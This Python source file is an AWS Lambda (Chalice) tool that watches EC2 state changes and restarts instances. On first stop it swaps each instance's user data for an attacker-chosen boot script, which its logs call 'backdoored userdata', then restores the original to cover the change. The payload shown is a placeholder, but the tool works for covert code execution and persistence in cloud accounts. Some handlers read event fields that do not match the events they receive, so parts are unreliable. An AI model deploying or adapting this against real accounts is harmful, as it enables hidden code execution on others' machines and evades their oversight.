import base64
import json
from enum import Enum
import time
from typing import TYPE_CHECKING

import boto3
from chalice import Chalice
from typing import TypedDict, List

if TYPE_CHECKING:
    import mypy_boto3_ec2
    import mypy_boto3_sqs
    import mypy_boto3_dynamodb
    import mypy_boto3_dynamodb.type_defs
    import chalice.app

# These are also hardcoded in cloudformation.json
DYNAMODB_TABLE = 'UserDataSwap'
SQS_QUEUE = 'user-data-swap-restart-delay'

USER_DATA = '''\
#cloud-config

bootcmd:
 - echo HELLO FROM USER DATA SCRIPT | tee /msg > /dev/kmsg
 - poweroff
'''

InstanceState = TypedDict('InstanceState', {
    'code': int,
    'name': str
})

InstanceSet = TypedDict('InstanceSet', {
    'imageId': str,
    'minCount': int,
    'maxCount': int,
    'keyName': str,
    'instanceId': str,
    'instanceState': InstanceState,
    'privateDnsName': str,
    'amiLaunchIndex': int,
    'productCodes': dict,
    'instanceType': str,
    'launchTime': int,
})

InstancesSet = TypedDict('InstancesSet', {
    'items': List[InstanceSet]
})

RequestParameters = TypedDict('RequestParameters', {
    'userData': str,
    'instancesSet': InstancesSet,
})

ResponseParameters = TypedDict('ResponseParameters', {
  'requestId': str,
  'reservationId': str,
  'ownerId': str,
  'groupSet': dict,
  'instancesSet': InstancesSet,
})

RunInstanceEvent = TypedDict('RunInstanceEvent', {
    'eventVersion': str,
    'userIdentity': dict,
    'eventTime': str,
    'eventName': str,
    'sourceIPAddress': str,
    'userAgent': str,
    'requestParameters': RequestParameters,
    'responseElements': ResponseParameters,
    'requestID': str,
    'eventID': str,
    'readOnly': bool,
    'eventType': str,
    'managementEvent': bool,
    'recipientAccountId': str,
    'eventCategory': str
})


class InstanceState(Enum):
     RUNNING = "running"
     STOPPED = "stopped"


InstanceChangeNotification = TypedDict( 'InstanceChangeNotification', {
    "instance-id": str,
    "state": InstanceState,
})

app = Chalice(app_name='user-data-swap')

sess = boto3.Session()
ec2 = sess.resource('ec2')


def swap_user_data(inst: 'mypy_boto3_ec2.ServiceResource.Instance', user_data: str, force: bool = True):
    print("current state: " + str(inst.state['Name']))
    inst.stop(Force=force)

    print("waiting for stopped state")
    wait_for(inst, "stopped")

    print("modifing user data")
    inst.modify_attribute(UserData={"Value": user_data.encode()})

    print("starting")
    inst.start()

@app.on_cw_event({
  "source": ["aws.ec2"],
  "detail-type": ["EC2 Instance State-change Notification"],
  "detail": {
    "state": ["pending", "running", "stopped"]
  }
})
def on_ec2_run(event: 'chalice.app.CloudWatchEvent'):
    """Triggered when a new instance is spun up, we simply forward the message to a SQS queue with a delay.

    The reason we may want to add a delay here is because some tools connect on start up to configure the instance,
    for example terraform with the SSH provider. If we restart immediately we will likely get a new public IP address
    and terraform will never connect to the instance. The delay here is simply a best guess since we can't actually
    determine when configuration is complete.

    :param event: CloudWatchEvent object passed in by chalice.
    :return: {'status': "done"}
    """
    sqs = boto3.resource('sqs')
    queue = sqs.Queue(SQS_QUEUE)
    queue.send_message(MessageBody=json.dumps(event.detail), DelaySeconds=120)
    return {'status': "done"}


@app.on_sqs_message(queue=SQS_QUEUE)
def restart(event: 'chalice.app.SQSEvent'):
    """Stop and start the instance specified in the passed event object.

    This function actively stops and starts the instance passed in on the event object, triggering the passive handling
    of userdata in the on_stop function.

    :param event: SQSEvent object passed in by chalice.
    :return: {'status': "done"}
    """
    app.log.info("Event: %s", json.dumps(event.to_dict()))
    orig_user_data = event.detail['requestParameters'].get('userData', '')
    print("original user data: " + orig_user_data)
    event = event.to_dict()

    for instance in event['responseElements']['instancesSet']['items']:
        inst = ec2.Instance(instance['instanceId'])
        print(f"{inst.id}: stopping instance")
        inst.stop()
        print(f"{inst.id}: waiting for stopped state")
        wait_for(inst, "stopped")

        # Replacing userdata is handled by the on_stop function which is triggered by EC2 state change notifications
        # It should run pretty quick, but we'll sleep for a second or two here just in case.
        time.sleep(1)

        print(f"{inst.id}: starting instance")
        inst.start()

    return {'status': "done"}


# Valid States: ["pending", "running", "shutting-down", "terminated", "stopping", "stopped"]
#
@app.on_cw_event({
  "source": ["aws.ec2"],
  "detail-type": ["EC2 Instance State-change Notification"],
  "detail": {
    "state": ["stopped"]
  }
})
def on_stop(event: 'chalice.app.CloudWatchEvent') -> dict:
    """Runs on the instance stop event and sets or reverts userdata based on tracked instance state.

    If this function has not seen this instance before then we set our own custom user data and set the tracked
    instance state to pending_reset.

    If the instance was found to be in the pending_reset state then we reset the user data back to it's original value
    and set the tracked instance state to completed.

    If the instance was found to be in the completed state we do nothing and exit.

    :param event: CloudWatchEvent object passed in by chalice.
    :return: Dictionary containing previous and current instance states.
    """
    detail: InstanceChangeNotification = event.detail

    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table(DYNAMODB_TABLE)

    ec2 = boto3.resource('ec2')
    inst = ec2.Instance(detail['instance-id'])

    resp = table.get_item(Key={'instance_id': detail['instance-id']})
    inst_state = None
    if resp.get('Item'):
        inst_state = resp['Item'].get('inst_state')

    new_state = None
    if not inst_state:
        print(f"'{inst.id}' (inst_state {inst_state}): setting backdoored userdata")
        orig_userdata = set_userdata(inst, USER_DATA)
        update_item(table, inst.id, 'orig_userdata', orig_userdata)

        new_state = 'pending_reset'
        update_item(table, inst.id, 'inst_state', new_state)
        print(f"'{inst.id}' (inst_state {inst_state}): backdoored userdata set, set state to 'pending_reset'")
    elif inst_state == 'pending_reset':
        print(f"'{inst.id}' (state {inst_state}): reverting to original user data")
        orig_userdata = get_item(table, inst.id, 'orig_userdata')
        set_userdata(inst, orig_userdata)
        print(f"'{inst.id}' (inst_state {inst_state}): reverted to original user data")

        new_state = 'completed'
        update_item(table, inst.id, 'inst_state', new_state)
        print(f"'{inst.id}' (inst_state {inst_state}): starting, set inst_state to 'completed'")
    elif inst_state == 'completed':
        print(f"'{inst.id}' (inst_state {inst_state}): skipping due to state == 'completed'")
    else:
        raise UserWarning(f"{inst.id} in unknown inst_state: {inst_state}")

    return {'previous_state': inst_state, 'current_state': new_state}


def update_item(table: 'mypy_boto3_dynamodb.ServiceResource.Table', inst_id: str, key: str, value: str):
    table.update_item(
        Key={
            'instance_id': inst_id,
        },
        UpdateExpression=f"set {key}=:v",
        ExpressionAttributeValues={
            ':v': value,
        },
    )


def get_item(table: 'mypy_boto3_dynamodb.ServiceResource.Table', inst_id, key):
    resp: 'mypy_boto3_dynamodb.type_defs.GetItemOutputTypeDef' = table.get_item(
        Key={
            'instance_id': inst_id,
        },
        AttributesToGet=[key],
    )
    return resp['Item'][key]


def set_userdata(inst: 'mypy_boto3_ec2.ServiceResource.Instance', user_data: str) -> str:
    resp = inst.describe_attribute(Attribute="userData")
    orig_userdata = base64.b64decode(resp['UserData'].get('Value', '')).decode()
    inst.modify_attribute(UserData={"Value": user_data.encode()})
    return orig_userdata


def wait_for(inst: 'mypy_boto3_ec2.ServiceResource.Instance', state: str, sleep=2, max_tries=300):
    tries = 0
    inst.reload()
    while inst.state["Name"] != state:
        tries += 1
        if tries >= max_tries:
            raise UserWarning(f'exceeded max tries while waiting for {inst.id} to enter the {state} state')
        inst.reload()
        time.sleep(sleep)
